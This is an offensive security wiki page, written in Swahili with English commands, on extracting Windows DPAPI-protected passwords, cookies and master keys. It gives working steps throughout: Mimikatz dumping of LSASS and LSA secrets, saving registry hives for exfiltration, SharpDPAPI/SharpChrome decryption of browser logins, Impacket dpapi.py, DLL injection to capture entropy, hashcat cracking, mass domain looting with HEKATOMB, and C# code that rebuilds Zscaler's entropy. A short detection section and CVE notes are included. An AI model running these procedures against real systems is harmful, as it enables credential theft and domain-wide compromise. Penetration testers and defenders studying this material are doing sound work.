# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

Data Protection API (DPAPI) hutumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa **usimbaji fiche wa symmetric wa funguo binafsi za asymmetric**, kwa kutumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Mbinu hii hurahisisha usimbaji fiche kwa developers kwa kuwawezesha kusimba data kwa kutumia key inayotokana na siri za kuingia za mtumiaji au, kwa usimbaji fiche wa mfumo, siri za uthibitishaji wa domain ya mfumo. Hivyo, developers hawahitaji kusimamia ulinzi wa encryption key wenyewe.

Njia inayotumika zaidi kutumia DPAPI ni kupitia functions za **`CryptProtectData` na `CryptUnprotectData`**, ambazo huwezesha applications kusimba na kufungua data kwa kutumia security context ya process iliyoingia kwa sasa. Kwa default, data inaweza kufunguliwa tu na user au system context ile ile iliyoisimba.<sup>[[2]](#references)[[3]](#references)</sup>

Functions hizi pia hupokea **entropy parameter** ya hiari inayotumika wakati wa encryption na decryption. Data iliyolindwa kwa entropy ya hiari huhitaji thamani hiyo hiyo ya entropy ili kufunguliwa.<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPI hutengeneza thamani maalum ya mtumiaji (ambayo mara nyingi huitwa **pre-key**) kutoka kwenye credentials za mtumiaji. Uundaji wake halisi hutegemea account na toleo la operating system; kwa domain users, tooling inaweza kupata thamani inayohitajika kutoka kwenye NTLM material ya mtumiaji.<sup>[[2]](#references)</sup>

Hili ni muhimu hasa kwa sababu attacker akifanikiwa kupata password hash ya mtumiaji, anaweza:

- **Kufungua data yoyote iliyosimbwa kwa kutumia DPAPI** na key ya mtumiaji huyo bila kuhitaji kuwasiliana na API yoyote
- Kujaribu **ku-crack password** offline kwa kujaribu kutengeneza DPAPI key sahihi

DPAPI huhifadhi **master keys** moja au zaidi kwa kila mtumiaji badala ya kutengeneza master key mpya kwa kila protected blob. Kila master key ina **GUID** (Globally Unique Identifier), na encrypted blob hurekodi ni master key gani inayolinda blob hiyo.<sup>[[2]](#references)</sup>

Master keys huhifadhiwa katika directory ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya mtumiaji. Master-key file ina material iliyolindwa na **pre-key** ya mtumiaji na, kwa domain users, recovery material iliyolindwa na **domain backup key**.<sup>[[2]](#references)</sup>

Kumbuka kwamba **domain key inayotumika kusimba master key iko kwenye domain controllers na haibadiliki kamwe**, kwa hiyo attacker akiwa na access kwa domain controller, anaweza kupata domain backup key na kufungua master keys za users wote kwenye domain.<sup>[[2]](#references)</sup>

Encrypted blobs zina **GUID ya master key** iliyotumika kusimba data iliyo ndani ya headers zake.

> [!TIP]
> DPAPI encrypted blobs huanza na **`01 00 00 00`**

Tafuta master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hivi ndivyo kundi la Master Keys za mtumiaji litakavyoonekana:

![DPAPI ni nini - Uzalishaji wa Users key: Hivi ndivyo kundi la Master Keys za mtumiaji litakavyoonekana](<../../images/image (1121).png>)

### Uzalishaji wa Machine/System key

Hii ni key inayotumiwa na machine kusimba data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni key maalum inayoweza kufikiwa na mtumiaji wa SYSTEM pekee. Key hii hutumiwa kusimba data inayohitaji kufikiwa na system yenyewe, kama vile machine-level credentials au system-wide secrets.<sup>[[2]](#references)</sup>

Kumbuka kwamba keys hizi **hazina domain backup**, kwa hiyo zinaweza kufikiwa locally pekee:

- **Mimikatz** inaweza kuifikia kwa kudump LSA secrets kwa kutumia command: `mimikatz lsadump::secrets`
- Secret imehifadhiwa ndani ya registry, kwa hiyo administrator anaweza **kubadilisha ruhusa za DACL ili kuifikia**. Registry path ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction kutoka kwa registry hives pia inawezekana. Kwa mfano, ukiwa administrator kwenye target, hifadhi hives na uziexfiltrate:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Kisha kwenye analysis box yako, rejesha siri ya DPAPI_SYSTEM LSA kutoka kwenye hives na uitumie kusimbua blobs za machine-scope (manenosiri ya scheduled task, credentials za service, Wi‑Fi profiles, n.k.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Data Inayolindwa na DPAPI

Miongoni mwa data ya kibinafsi inayolindwa na DPAPI ni:

- Windows creds
- Passwords za Internet Explorer na Google Chrome pamoja na data ya auto-completion
- Passwords za akaunti za E-mail na FTP ya ndani kwa applications kama Outlook na Windows Mail
- Passwords za shared folders, resources, wireless networks, na Windows Vault, ikijumuisha encryption keys
- Passwords za remote desktop connections, .NET Passport, na private keys kwa madhumuni mbalimbali ya encryption na authentication
- Passwords za network zinazosimamiwa na Credential Manager na data ya kibinafsi katika applications zinazotumia CryptProtectData, kama Skype, MSN messenger, na nyinginezo
- Encrypted blobs ndani ya registry
- ...

Data inayolindwa na mfumo inajumuisha:
- Passwords za Wifi
- Passwords za scheduled tasks
- ...

### Chaguo za kutoa master key

- Ikiwa mtumiaji ana domain admin privileges, anaweza kufikia **domain backup key** ili kufuta encryption ya user master keys zote katika domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Kwa kutumia **marupurupu ya local admin**, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa master keys za DPAPI za watumiaji wote waliounganishwa pamoja na key ya SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana privileges za local admin, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili kufungua machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa password au hash ya NTLM ya user inajulikana, unaweza **kudecrypt master keys za user moja kwa moja**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya session kama mtumiaji, inawezekana kuiomba DC **backup key ya kusimbua master keys kwa kutumia RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **kuiba session token yake** kwa ajili ya hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodhesha Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Data Iliyosimbwa kwa DPAPI

### Tafuta data iliyosimbwa kwa DPAPI

**Faili zinazolindwa** za watumiaji wa kawaida ziko katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pia angalia kwa kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.

Mifano ya enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata blobs zilizotiwa encryption na DPAPI katika mfumo wa faili, registry na B64 blobs:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo hiyo hiyo) inaweza kutumika kufanya decryption kwa kutumia DPAPI ya data nyeti kama vile cookies.<sup>[[12]](#references)</sup>

#### Mapishi ya haraka ya Chromium/Edge/Electron (SharpChrome)

- User wa sasa, decryption shirikishi ya saved logins/cookies (inafanya kazi hata kwa cookies zilizo-bind kwenye app za Chrome 127+ kwa sababu key ya ziada hutatuliwa kutoka kwenye Credential Manager ya user wakati inaendeshwa katika user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Uchanganuzi wa nje ya mtandao unapokuwa na files pekee. Kwanza toa AES state key kutoka kwa "Local State" ya profile, kisha uitumie kusimbua cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage ya domain nzima/ya mbali unapokuwa na DPAPI domain backup key (PVK) na admin kwenye host lengwa:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na kusimbua data ya profile moja kwa moja:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Maelezo
- Chrome/Edge builds mpya zaidi zinaweza kuhifadhi baadhi ya cookies kwa kutumia encryption ya "App-Bound". Offline decryption ya cookies hizo mahususi haiwezekani bila app-bound key ya ziada; endesha SharpChrome chini ya context ya user lengwa ili kuipata kiotomatiki. Tazama chapisho la security blog la Chrome lililotajwa hapa chini.<sup>[[5]](#references)</sup>

### Funguo za ufikiaji na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwa files zilizo-encryptiwa na DPAPI katika session ya sasa:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata taarifa za credentials** kama vile data iliyosimbwa na guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Fikia masterkeys**:

Decrypt masterkey ya mtumiaji anayeomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Zana ya **SharpDPAPI** pia inatumia arguments hizi kwa masterkey decryption (kumbuka kwamba inawezekana kutumia `/rpc` kupata domains backup key, `/password` kutumia plaintext password, au `/pvk` kubainisha faili ya DPAPI domain private key...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt data kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inasaidia arguments hizi kwa decryption ya `credentials|vaults|rdg|keepass|triage|blob|ps` (angalia jinsi inavyowezekana kutumia `/rpc` kupata domain backup key, `/password` kutumia plaintext password, `/pvk` kubainisha faili ya DPAPI domain private key, `/unprotect` kutumia session ya mtumiaji wa sasa...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna password inayohitajika)

Ikiwa unaweza kudump LSASS, Mimikatz mara nyingi hufichua DPAPI key ya kila logon ambayo inaweza kutumika ku-decrypt masterkeys za mtumiaji bila kujua password ya maandishi wazi. Pitisha thamani hii moja kwa moja kwenye tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Decrypt data fulani kwa kutumia **session ya mtumiaji wa sasa**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Usimbuaji wa data bila mtandao kwa kutumia Impacket dpapi.py

Ikiwa una SID na password ya mtumiaji mwathiriwa (au NT hash), unaweza kusimbua masterkeys za DPAPI na blobs za Credential Manager kabisa bila mtandao ukitumia Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Tambua artefacts kwenye diski:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa zana za kuhamisha faili hazifanyi kazi vizuri, badilisha faili ziwe base64 kwenye host kisha unakili matokeo:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decrypt masterkey kwa kutumia SID na password/hash ya mtumiaji:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Tumia masterkey iliyodecryptiwa ku-decrypt credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Utaratibu huu mara nyingi hurejesha domain credentials zilizohifadhiwa na apps zinazotumia Windows Credential Manager, ikijumuisha akaunti za kiutawala (kwa mfano, `*_adm`).

---

### Kushughulikia Optional Entropy ("Third-party entropy")

Baadhi ya applications hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi ku-decryptiwa, hata kama masterkey sahihi inajulikana. Kwa hivyo, kupata entropy ni muhimu wakati wa kulenga credentials zilizolindwa kwa njia hii (kwa mfano, Microsoft Outlook na baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode inayohook functions za DPAPI ndani ya target process na kurekodi kwa uwazi optional entropy yoyote inayotolewa. Kuendesha EntropyCapture katika mode ya **DLL-injection** dhidi ya processes kama `outlook.exe` au `vpnclient.exe` kutatoa faili inayopanga kila entropy buffer na calling process pamoja na blob. Entropy iliyonaswa inaweza baadaye kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili ku-decrypt data.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha muundo wa **context 3** wa masterkey kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), hivyo kuwezesha cracking inayoharakishwa na GPU ya password za watumiaji moja kwa moja kutoka kwenye faili la masterkey. Kwa hiyo, attackers wanaweza kufanya mashambulizi ya word-list au brute-force bila kuwasiliana na mfumo lengwa.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) hu-automate mchakato:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Tool hii pia inaweza kuchanganua Credential na Vault blobs, kuzisimbua kwa kutumia funguo zilizopatikana kwa cracking na kuhamisha passwords zilizo katika maandishi wazi.<sup>[[8]](#references)</sup>


### Fikia data ya mashine nyingine

Katika **SharpDPAPI na SharpChrome** unaweza kubainisha chaguo la **`/server:HOST`** ili kufikia data ya mashine ya mbali. Bila shaka, unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inachukuliwa kuwa **domain backup encryption key inajulikana**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni tool inayowezesha kiotomatiki extraction ya users na computers wote kutoka kwenye LDAP directory, pamoja na extraction ya domain controller backup key kupitia RPC. Kisha script itatatua IP address za computers zote na kufanya smbclient kwenye kila computer ili kuretrieve DPAPI blobs zote za users wote na ku-decrypt kila kitu kwa kutumia domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa kutumia computers list iliyotolewa kutoka LDAP, unaweza kupata kila subnet hata kama hukuijua hapo awali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kudump secrets zinazolindwa na DPAPI kiotomatiki. Toleo la 2.x lilianzisha:<sup>[[9]](#references)</sup>

* Parallel collection ya blobs kutoka kwa mamia ya hosts
* Parsing ya **context 3** masterkeys na integration ya automatic Hashcat cracking
* Support ya cookies zilizosimbwa kwa Chrome "App-Bound" (tazama sehemu inayofuata)
* Mode mpya ya **`--snapshot`** ya kupoll endpoints mara kwa mara na kutofautisha blobs mpya zilizoundwa

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni C# parser ya masterkey/credential/vault files inayoweza kutoa formats za Hashcat/JtR na, kwa hiari, kuanzisha cracking kiotomatiki. Inasaidia kikamilifu machine na user masterkey formats hadi Windows 11 24H1.<sup>[[8]](#references)</sup>


## Detections za kawaida

- Access kwa files zilizo kwenye `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na directories nyingine zinazohusiana na DPAPI.
- Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au tooling inayofanana ili kupata access kwa LSASS memory au kudump masterkeys.
- Event **4662**: *An operation was performed on an object* – inaweza kuhusishwa na access kwa object ya **`BCKUPKEY`**.
- Event **4673/4674** wakati process inapoomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilities za 2023-2025 na mabadiliko ya ecosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Attacker mwenye network access angeweza kudanganya domain member ili iretrieve malicious DPAPI backup key, na hivyo kuruhusu decryption ya user masterkeys. Ilipatiwa patch katika November 2023 cumulative update – administrators wanapaswa kuhakikisha kuwa DCs na workstations zimewekewa patches zote kikamilifu.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ilibadilisha legacy DPAPI-only protection kwa kuongeza key nyingine iliyohifadhiwa chini ya **Credential Manager** ya user. Offline decryption ya cookies sasa inahitaji DPAPI masterkey pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurecover key hiyo ya ziada zinapoendeshwa na user context.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – Custom Entropy Iliyotokana na SID

Zscaler Client Connector huhifadhi configuration files kadhaa chini ya `C:\ProgramData\Zscaler` (kwa mfano, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila file imesimbwa kwa **DPAPI (Machine scope)**, lakini vendor hutoa **custom entropy** ambayo *hukokotolewa wakati wa runtime* badala ya kuhifadhiwa kwenye disk.<sup>[[1]](#references)</sup>

Entropy hiyo hujengwa upya kutokana na elements mbili:

1. Secret iliyowekwa moja kwa moja ndani ya `ZSACredentialProvider.dll`.
2. **SID** ya Windows account ambayo configuration hiyo inahusiana nayo.

Algorithm iliyotekelezwa na DLL ni sawa na:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa sababu secret imepachikwa kwenye DLL inayoweza kusomwa kutoka kwenye disk, **attacker yeyote wa ndani aliye na haki za SYSTEM anaweza kutengeneza upya entropy kwa SID yoyote** na kusimbua blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption hutoa **JSON configuration** kamili, ikijumuisha kila **device posture check** na thamani yake inayotarajiwa – taarifa yenye thamani kubwa sana wakati wa kujaribu client-side bypasses.

> TIP: encrypted artefacts nyingine (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa kwa DPAPI **bila** entropy (`16` zero bytes). Kwa hivyo zinaweza ku-decryptiwa moja kwa moja kwa `ProtectedData.Unprotect` mara tu SYSTEM privileges zinapopatikana.

## References

- [1] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita ukaguzi wa Zscaler posture](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Uchambuzi wa usalama na urejeshaji wa data katika DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Kusoma Secrets zilizosimbwa kwa DPAPI kwa kutumia Mimikatz na C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Kuboresha usalama wa Chrome cookies kwenye Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Utoaji rahisi wa DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Maelezo ya toleo la hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – Ukurasa wa mradi kwenye PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Matumizi mabaya ya AD ACL, kuvunja KeePassXC Argon2, na DPAPI decryption hadi DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Matumizi na chaguo](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
